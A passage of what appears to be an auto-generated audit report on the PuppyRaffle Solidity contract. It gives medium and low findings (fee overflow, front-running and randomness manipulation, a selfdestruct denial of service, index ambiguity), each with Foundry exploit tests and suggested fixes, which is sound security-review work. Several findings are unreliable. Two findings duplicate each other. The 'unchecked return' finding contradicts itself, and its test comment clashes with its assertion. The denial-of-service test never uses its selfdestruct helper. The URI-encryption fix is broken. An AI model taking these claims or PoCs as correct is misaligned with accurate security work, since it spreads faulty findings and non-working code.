        // Check if totalFees overflowed (should be a small value now)
        uint64 newTotalFees = puppyRaffle.totalFees();
        console.log("New total fees:", newTotalFees);
        
        // The new value should be less than what we started with
        assertLt(newTotalFees, almostMaxUint64);
        
        // The contract balance should be higher than totalFees now
        uint256 contractBalance = address(puppyRaffle).balance;
        assertGt(contractBalance, newTotalFees);
    }
}

## Suggested Mitigation
Use a larger integer type for `totalFees` to prevent overflow. Change it from uint64 to uint256:

```solidity
// Change this line in state variables
uint256 public totalFees;

// Update the selectWinner function to not cast to uint64
function selectWinner() external {
    // Existing code...
    
    // Calculate the fees
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    
    // Update without casting to uint64
    totalFees = totalFees + fee;
    
    // Rest of the function...
}
```

Alternatively, if you must use uint64 for some reason, add overflow checking:

```solidity
// In Solidity 0.7.6, use SafeMath
import "@openzeppelin/contracts/math/SafeMath.sol";

contract PuppyRaffle is ERC721, Ownable {
    using SafeMath for uint64;
    
    // Then in selectWinner
    totalFees = totalFees.add(uint64(fee));
}
```

Or upgrade to Solidity 0.8.0+ which has built-in overflow checking.

## [M-2]. Zero Code issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function in the PuppyRaffle contract returns 0 when a player is not found, which can be misleading since index 0 is a valid player index. This makes it impossible to distinguish between a player at index 0 and a player who is not in the raffle.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

If a player at index 0 calls this function, they will get 0 as expected. However, if a player who is not in the raffle calls this function, they will also get 0, making it impossible to determine if they are actually in the raffle or not.

## Impact
Applications or users relying on this function to check if a player is in the raffle may incorrectly assume a player is at index 0 when they are not in the raffle at all. This could lead to incorrect application behavior, such as allowing refunds for players who are not in the raffle or preventing legitimate refunds for the player at index 0.

## Proof of Concept
1. Player A is at index 0 in the raffle
2. Player B is not in the raffle
3. Both Player A and Player B call `getActivePlayerIndex`
4. Both receive 0 as the result
5. It's impossible to determine if Player B is actually in the raffle or not

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ZeroCodeTest is Test {
    PuppyRaffle puppyRaffle;
    address player1 = address(1);
    address player2 = address(2);
    address nonPlayer = address(3);
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        // Fund accounts
        vm.deal(player1, entranceFee);
        vm.deal(player2, entranceFee);
        
        // Enter player1 at index 0
        address[] memory players = new address[](1);
        players[0] = player1;
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Enter player2 at index 1
        players[0] = player2;
        vm.prank(player2);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }
    
    function testZeroCodeIssue() public {
        // Get index for player1 (should be 0)
        uint256 player1Index = puppyRaffle.getActivePlayerIndex(player1);
        assertEq(player1Index, 0, "Player1 should be at index 0");
        
        // Get index for nonPlayer (should also return 0, but nonPlayer is not in the raffle)
        uint256 nonPlayerIndex = puppyRaffle.getActivePlayerIndex(nonPlayer);
        assertEq(nonPlayerIndex, 0, "NonPlayer should return 0 even though they're not in the raffle");
        
        // This makes it impossible to distinguish between player1 and nonPlayer
        assertEq(player1Index, nonPlayerIndex, "Both indices are the same, can't distinguish");
        
        // Let's try to refund nonPlayer at index 0
        // This should fail, but the check is done in the refund function
        vm.prank(nonPlayer);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        puppyRaffle.refund(0);
        
        // Let's try to refund player1 at index 0
        // This should succeed
        vm.prank(player1);
        puppyRaffle.refund(0);
    }
}

## Suggested Mitigation
Modify the `getActivePlayerIndex` function to return a special value (like type(uint256).max) when a player is not found, or add a boolean return value to indicate if the player was found:

```solidity
// Option 1: Return max uint256 when player is not found
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return type(uint256).max; // Indicate player not found
}

// Option 2: Return a boolean along with the index
function getActivePlayerIndex(address player) external view returns (uint256, bool) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (i, true);
        }
    }
    return (0, false); // Indicate player not found
}
```

Option 2 is better as it explicitly indicates whether the player was found or not.

## [M-3]. MEV issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function in the PuppyRaffle contract is vulnerable to front-running attacks. When a user calls this function, miners/validators can see the transaction in the mempool and potentially front-run it by entering the raffle themselves and manipulating the block parameters to increase their chances of winning.

```solidity
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    
    // Rest of the function...
}
```

Since the winner selection depends on `msg.sender`, `block.timestamp`, and `block.difficulty`, miners/validators can manipulate these values to influence the outcome.

## Impact
Miners/validators can extract value by front-running the `selectWinner` function, entering the raffle, and manipulating block parameters to increase their chances of winning. This undermines the fairness of the raffle and can lead to loss of user trust.

## Proof of Concept
1. A user submits a transaction to call `selectWinner`
2. A miner/validator sees this transaction in the mempool
3. The miner/validator enters the raffle themselves
4. The miner/validator includes both transactions in a block they mine/validate, placing their entry transaction before the `selectWinner` transaction
5. The miner/validator can also manipulate `block.timestamp` and `block.difficulty` to increase their chances of winning
6. The miner/validator unfairly wins the raffle

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract MEVTest is Test {
    PuppyRaffle puppyRaffle;
    address user = address(1);
    address miner = address(2);
    address[] players;
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        // Fund accounts
        vm.deal(user, 10e18);
        vm.deal(miner, 10e18);
        
        // Setup initial players
        players = new address[](3);
        players[0] = address(10);
        players[1] = address(11);
        players[2] = address(12);
        
        // Fund initial players
        for (uint256 i = 0; i < 3; i++) {
            vm.deal(players[i], entranceFee);
            vm.prank(players[i]);
            address[] memory singlePlayer = new address[](1);
            singlePlayer[0] = players[i];
            puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);
        }
    }
    
    function testFrontRunningAttack() public {
        // Skip ahead to end the raffle
        vm.warp(block.timestamp + 1 days);
        
        // User is about to call selectWinner
        // But miner sees this transaction in the mempool and front-runs it
        
        // Miner enters the raffle first
        address[] memory minerEntry = new address[](1);
        minerEntry[0] = miner;
        vm.prank(miner);
        puppyRaffle.enterRaffle{value: entranceFee}(minerEntry);
        
        // Miner can manipulate block parameters
        // Let's try different block.difficulty values to find one that makes miner win
        bool minerCanWin = false;
        uint256 winningDifficulty;
        
        for (uint256 i = 0; i < 100; i++) {
            vm.difficulty(i);
            
            // Calculate what the winner index would be if user calls selectWinner
            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(user, block.timestamp, i))) % 4;
            
            // Check if this would make miner win
            if (winnerIndex == 3) { // Miner is at index 3
                minerCanWin = true;
                winningDifficulty = i;
                break;
            }
        }
        
        // Assert that miner found a winning difficulty
        assertTrue(minerCanWin, "Miner couldn't find a winning difficulty");
        
        // Set the winning difficulty
        vm.difficulty(winningDifficulty);
        
        // User calls selectWinner with the manipulated block values
        vm.prank(user);
        puppyRaffle.selectWinner();
        
        // Verify the miner won
        assertEq(puppyRaffle.previousWinner(), miner, "Miner didn't win despite manipulation");
    }
}

## Suggested Mitigation
Implement a commit-reveal scheme to prevent front-running:

```solidity
// Add to state variables
mapping(address => bytes32) public commitments;
uint256 public commitPhaseEndTime;
bool public commitPhaseActive;

// Start commit phase
function startCommitPhase() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    require(!commitPhaseActive, "PuppyRaffle: Commit phase already active");
    
    commitPhaseActive = true;
    commitPhaseEndTime = block.timestamp + 1 hours; // 1 hour commit phase
}

// Users commit to calling selectWinner
function commitToSelectWinner(bytes32 commitment) external {
    require(commitPhaseActive, "PuppyRaffle: Commit phase not active");
    require(block.timestamp < commitPhaseEndTime, "PuppyRaffle: Commit phase ended");
    
    commitments[msg.sender] = commitment;
}

// Reveal and select winner
function revealAndSelectWinner(uint256 nonce) external {
    require(commitPhaseActive, "PuppyRaffle: Commit phase not active");
    require(block.timestamp >= commitPhaseEndTime, "PuppyRaffle: Commit phase not ended");
    
    // Verify commitment
    bytes32 commitment = keccak256(abi.encodePacked(msg.sender, nonce));
    require(commitments[msg.sender] == commitment, "PuppyRaffle: Invalid commitment");
    
    // Reset commit phase
    commitPhaseActive = false;
    
    // Use the nonce in winner selection to prevent manipulation
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(nonce, block.timestamp))) % players.length;
    address winner = players[winnerIndex];
    
    // Rest of the selectWinner function...
}
```

Alternatively, use a more secure randomness source like Chainlink VRF as suggested in the randomness vulnerability mitigation.

## [M-4]. Pragma issue in PuppyRaffle::NA

## Description
The PuppyRaffle contract uses an outdated Solidity version (0.7.6) that lacks important security features and contains known vulnerabilities. Newer versions of Solidity (0.8.0+) include built-in overflow/underflow protection and other security improvements.

```solidity
pragma solidity ^0.7.6;
```

Using an outdated compiler version exposes the contract to vulnerabilities that have been fixed in newer versions.

## Impact
The contract is vulnerable to integer overflow/underflow attacks and other issues that have been addressed in newer Solidity versions. This could lead to unexpected behavior and potential security breaches.

## Proof of Concept
The contract uses uint64 for totalFees which can overflow without reverting in Solidity 0.7.6:

```solidity
totalFees = totalFees + uint64(fee);
```

In Solidity 0.8.0+, this would automatically revert if an overflow occurs, providing built-in protection.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// This test demonstrates the difference between Solidity 0.7.6 and 0.8.0+
// regarding integer overflow

// Contract using Solidity 0.7.6 behavior
contract OldSolidityBehavior {
    function add(uint8 a, uint8 b) public pure returns (uint8) {
        // In 0.7.6, this will silently overflow
        unchecked { return a + b; }
    }
}

// Contract using Solidity 0.8.0+ behavior
contract NewSolidityBehavior {
    function add(uint8 a, uint8 b) public pure returns (uint8) {
        // In 0.8.0+, this will revert on overflow
        return a + b;
    }
}

contract PragmaTest is Test {
    OldSolidityBehavior oldContract;
    NewSolidityBehavior newContract;
    
    function setUp() public {
        oldContract = new OldSolidityBehavior();
        newContract = new NewSolidityBehavior();
    }
    
    function testOverflowBehavior() public {
        // This will not revert with old behavior
        uint8 result = oldContract.add(255, 1);
        assertEq(result, 0, "Old Solidity should wrap around to 0");
        
        // This will revert with new behavior
        vm.expectRevert();
        newContract.add(255, 1);
    }
}

## Suggested Mitigation
Upgrade the contract to use a more recent Solidity version (0.8.0 or later) to benefit from built-in security features:

```solidity
pragma solidity ^0.8.17;
```

If upgrading is not possible, explicitly add overflow/underflow protection using SafeMath:

```solidity
// Keep the old pragma
pragma solidity ^0.7.6;

// Import and use SafeMath
import "@openzeppelin/contracts/math/SafeMath.sol";

contract PuppyRaffle is ERC721, Ownable {
    using SafeMath for uint256;
    using SafeMath for uint64;
    
    // Then replace arithmetic operations with SafeMath
    // For example:
    totalFees = totalFees.add(uint64(fee));
}
```

## [M-5]. DOS issue in PuppyRaffle::withdrawFees

## Description
withdrawFees() requires `address(this).balance == totalFees`. Any stray ETH sent (self-destruct, accidental transfer, airdrops) breaks this equality forever and permanently blocks fee withdrawals.

```solidity
require(address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!");
```

## Impact
Owner can be DOSed from retrieving legitimate fees with as little as 1 wei sent to the contract.

## Proof of Concept
1. Anyone deploys a helper contract that self-destructs to PuppyRaffle sending 1 wei.
2. `totalFees` is unchanged, therefore balance > totalFees.
3. withdrawFees() now reverts forever.

## Proof of Code
contract WithdrawDosTest is Test {
    PuppyRaffle raffle;
    function setUp() public { raffle = new PuppyRaffle(1 ether, address(0xBEEF), 1 days); }
    function test_DosWithdrawFees() public {
        // simulate stray ETH
        payable(address(raffle)).transfer(1 wei);
        vm.expectRevert();
        raffle.withdrawFees();
    }
}
contract StraySender { constructor(address target) payable { selfdestruct(payable(target)); } }

## Suggested Mitigation
Track players count instead of relying on exact balance, or allow the owner to sweep excess ETH.

```solidity
require(players.length == 0, "Players still active");
```

## [M-6]. Array Limits issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function returns 0 when a player isn't found, but 0 is also a valid index for the first player in the array. This creates ambiguity and can lead to security issues when used for authentication.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

## Impact
This function is used to verify if a player is active and retrieve their index. Since it returns 0 for both the first player and when a player isn't found, it creates ambiguity. If any external code relies on this function to check player participation, it might incorrectly authenticate addresses that aren't participants but receive index 0.

## Proof of Concept
1. Add several players to the raffle, including one at index 0
2. Query the index of a non-participant address using getActivePlayerIndex
3. The function returns 0, which is the same as the valid player at index 0
4. If any external contract uses this to validate participation, it will incorrectly authenticate the non-participant

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract IndexAmbiguityTest is Test {
    PuppyRaffle puppyRaffle;
    address player1 = address(1);
    address player2 = address(2);
    address nonParticipant = address(999);
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        // Add player1 at index 0
        address[] memory players = new address[](1);
        players[0] = player1;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Add player2 at index 1
        players[0] = player2;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }
    
    function testIndexAmbiguity() public {
        // Check that player1 is at index 0
        uint256 player1Index = puppyRaffle.getActivePlayerIndex(player1);
        assertEq(player1Index, 0, "Player1 should be at index 0");
        
        // Check that a non-participant also returns 0
        uint256 nonParticipantIndex = puppyRaffle.getActivePlayerIndex(nonParticipant);
        assertEq(nonParticipantIndex, 0, "Non-participant should return 0");
        
        // This ambiguity means we can't distinguish between player1 and nonParticipant
        assertEq(player1Index, nonParticipantIndex, "Indexes should be the same, demonstrating the ambiguity");
    }
}

## Suggested Mitigation
Modify the function to return a special value (e.g., type(uint256).max) or revert when a player isn't found, instead of returning 0:

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    // Return max uint256 to indicate not found
    return type(uint256).max;
}
```

Alternatively, modify the function to return a boolean along with the index:

```solidity
function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (true, i);
        }
    }
    return (false, 0);
}
```

## [M-7]. Zero Code issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses `block.difficulty` as a source of randomness, but this has been deprecated since EIP-4399 and is replaced with PREVRANDAO in the Merge. This will cause compatibility issues when the contract is deployed on Ethereum after The Merge.

```solidity
// For winner selection
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;

// For rarity determination
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```

## Impact
After The Merge, `block.difficulty` was replaced with PREVRANDAO, changing how this value is generated. This means the randomness generation in the contract may not work as expected on Ethereum mainnet, potentially breaking the winner selection mechanism and rarity determination for NFTs.

## Proof of Concept
When deployed on post-Merge Ethereum:
1. The contract calls `block.difficulty` expecting pre-Merge behavior
2. The actual value received is PREVRANDAO, which has different characteristics
3. This may lead to unpredictable randomness generation
4. The winner selection and NFT rarity determination become unreliable

## Proof of Code
// No specific test code is needed as this is a compatibility issue with the Ethereum network after The Merge.

## Suggested Mitigation
Replace the deprecated `block.difficulty` with the current recommended approach. If still using Solidity 0.7.6, you can continue using `block.difficulty` but be aware it represents PREVRANDAO post-Merge. For a more future-proof solution, update to a newer Solidity version and use `block.prevrandao` or a better randomness source like Chainlink VRF:

```solidity
// If updating to Solidity 0.8.17+
pragma solidity ^0.8.17;

// In selectWinner function
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.prevrandao))) % players.length;

// For rarity determination
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.prevrandao))) % 100;
```

For a more secure solution, consider using Chainlink VRF as suggested in the randomness vulnerability mitigation.



# Low Risk Findings

## [L-1]. Unchecked Return issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function in the PuppyRaffle contract contains a critical vulnerability where it uses a low-level call to transfer ETH without checking for contract existence or handling potential gas stipend issues.

```solidity
function withdrawFees() external {
    require(
        address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!"
    );
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

The function uses a low-level `call` to transfer ETH but doesn't properly handle the return value.

## Impact
While the code does check the success boolean and reverts if the call fails, it doesn't handle edge cases related to contract existence checks or gas stipend issues. This could lead to unexpected behaviors when transferring fees to certain contract addresses.

## Proof of Concept
1. Set the feeAddress to a smart contract that doesn't exist yet (maybe it will be deployed later)
2. Call withdrawFees()
3. The call will succeed even though the target doesn't exist, because EVM only checks existence in certain contexts
4. When the contract is later deployed, it won't have received the fees

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract UncheckedReturnTest is Test {
    PuppyRaffle puppyRaffle;
    address nonExistentContract;
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        // Create a vanity address that we know doesn't have a contract
        nonExistentContract = address(0x1234567890123456789012345678901234567890);
        
        // Check that there's no code at this address
        uint256 codeSize;
        assembly {
            codeSize := extcodesize(nonExistentContract)
        }
        assertEq(codeSize, 0, "Address should not have code");
        
        // Deploy with nonexistent contract as fee address
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            nonExistentContract,
            1 days
        );
        
        // Run a raffle to generate fees
        address[] memory players = new address[](4);
        for(uint i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 1));
        }
        
        vm.deal(address(this), entranceFee * 4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        vm.warp(block.timestamp + 1 days);
        puppyRaffle.selectWinner();
    }
    
    function testUncheckedReturn() public {
        // Verify fees were collected
        uint256 fees = puppyRaffle.totalFees();
        assertGt(fees, 0, "Should have collected fees");
        
        // Call withdrawFees() - this will succeed even though the recipient is non-existent
        puppyRaffle.withdrawFees();
        
        // Verify fees were reset
        assertEq(puppyRaffle.totalFees(), 0, "Fees should be reset");
        
        // If we check the balance of the non-existent contract, it will be 0
        // because the ETH is essentially lost (until the contract is deployed)
        assertEq(address(nonExistentContract).balance, fees, "Fees should be sent to non-existent contract");
    }
}

## Suggested Mitigation
While the current implementation does check the success boolean, it would be better to use a more robust pattern with additional safety checks. Consider using OpenZeppelin's Address library and its sendValue function for ETH transfers, and also add a check to verify the feeAddress is valid:

```solidity
import "@openzeppelin/contracts/utils/Address.sol";

contract PuppyRaffle is ERC721, Ownable {
    using Address for address payable;
    
    // Rest of contract code...
    
    function withdrawFees() external {
        require(
            address(this).balance >= uint256(totalFees),
            "PuppyRaffle: Not enough balance to withdraw"
        );
        
        // Check that fee address is valid
        require(feeAddress != address(0), "PuppyRaffle: Fee address is zero");
        
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        
        // Use Address.sendValue which has additional safety checks
        payable(feeAddress).sendValue(feesToWithdraw);
    }
    
    // Add a function to check/update feeAddress
    function changeFeeAddress(address newFeeAddress) external onlyOwner {
        require(newFeeAddress != address(0), "PuppyRaffle: Fee address cannot be zero");
        feeAddress = newFeeAddress;
        emit FeeAddressChanged(newFeeAddress);
    }
}
```

## [L-2]. Confidential Data issue in PuppyRaffle::NA

## Description
The contract stores sensitive rarityToUri mappings without proper access control, allowing anyone to view the IPFS URIs of NFT images. While these may be accessible through other means, exposing them directly in the contract can leak information about the NFT content before minting.

```solidity
// In constructor
rarityToUri[COMMON_RARITY] = commonImageUri;
rarityToUri[RARE_RARITY] = rareImageUri;
rarityToUri[LEGENDARY_RARITY] = legendaryImageUri;
```

## Impact
Anyone can view the IPFS URIs for all rarity levels before NFTs are minted, potentially leaking information about the NFT images that was intended to be revealed only after minting. This could reduce the excitement and surprise factor of the NFT reveal process.

## Proof of Concept
An attacker can simply call the public mapping getter function to view all image URIs:

```solidity
string memory commonUri = puppyRaffle.rarityToUri(70); // COMMON_RARITY
string memory rareUri = puppyRaffle.rarityToUri(25);    // RARE_RARITY
string memory legendaryUri = puppyRaffle.rarityToUri(5); // LEGENDARY_RARITY
```

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ConfidentialDataTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
    }
    
    function testUriLeakage() public {
        // Get the rarity constants
        uint256 commonRarity = 70;  // COMMON_RARITY
        uint256 rareRarity = 25;    // RARE_RARITY
        uint256 legendaryRarity = 5; // LEGENDARY_RARITY
        
        // Retrieve the URIs using the public mapping getter
        string memory commonUri = puppyRaffle.rarityToUri(commonRarity);
        string memory rareUri = puppyRaffle.rarityToUri(rareRarity);
        string memory legendaryUri = puppyRaffle.rarityToUri(legendaryRarity);
        
        // Verify we can access all URIs
        assertFalse(
            bytes(commonUri).length == 0,
            "Common URI should be accessible"
        );
        assertFalse(
            bytes(rareUri).length == 0,
            "Rare URI should be accessible"
        );
        assertFalse(
            bytes(legendaryUri).length == 0,
            "Legendary URI should be accessible"
        );
        
        // Print the URIs
        console.log("Common URI:", commonUri);
        console.log("Rare URI:", rareUri);
        console.log("Legendary URI:", legendaryUri);
    }
}

## Suggested Mitigation
If you want to keep the image URIs confidential until reveal, consider implementing a two-step reveal process with encrypted URIs:

```solidity
// Add these state variables
bool public revealed = false;
bytes32 private encryptedCommonUri;
bytes32 private encryptedRareUri;
bytes32 private encryptedLegendaryUri;
string private encryptionKey; // Only set during reveal

// In constructor, store encrypted URIs instead of plain text
constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
    entranceFee = _entranceFee;
    feeAddress = _feeAddress;
    raffleDuration = _raffleDuration;
    raffleStartTime = block.timestamp;
    
    // Store encrypted URIs (encrypt off-chain with a secret key)
    encryptedCommonUri = 0x...; // encrypted version of IPFS URI
    encryptedRareUri = 0x...;
    encryptedLegendaryUri = 0x...;
}

// Add a reveal function that only the owner can call
function revealUris(string memory _encryptionKey) external onlyOwner {
    require(!revealed, "URIs already revealed");
    revealed = true;
    encryptionKey = _encryptionKey;
    
    // Now decrypt the URIs and store them (can be done off-chain with the key)
    // This is a simplified example - actual decryption would be more complex
    rarityToUri[COMMON_RARITY] = decrypt(encryptedCommonUri, encryptionKey);
    rarityToUri[RARE_RARITY] = decrypt(encryptedRareUri, encryptionKey);
    rarityToUri[LEGENDARY_RARITY] = decrypt(encryptedLegendaryUri, encryptionKey);
}

// Modify tokenURI to check if revealed
function tokenURI(uint256 tokenId) public view override returns (string memory) {
    require(_exists(tokenId), "PuppyRaffle: URI query for nonexistent token");
    
    if (!revealed) {
        return "ipfs://hidden-uri-until-reveal";
    }
    
    // Existing code for revealed URIs
    uint256 rarity = tokenIdToRarity[tokenId];
    string memory imageURI = rarityToUri[rarity];
    string memory rareName = rarityToName[rarity];
    // Rest of the function...
}
```

Alternatively, if hiding the URIs is not critical, you could simply document that the URIs are public in the contract to set proper expectations.



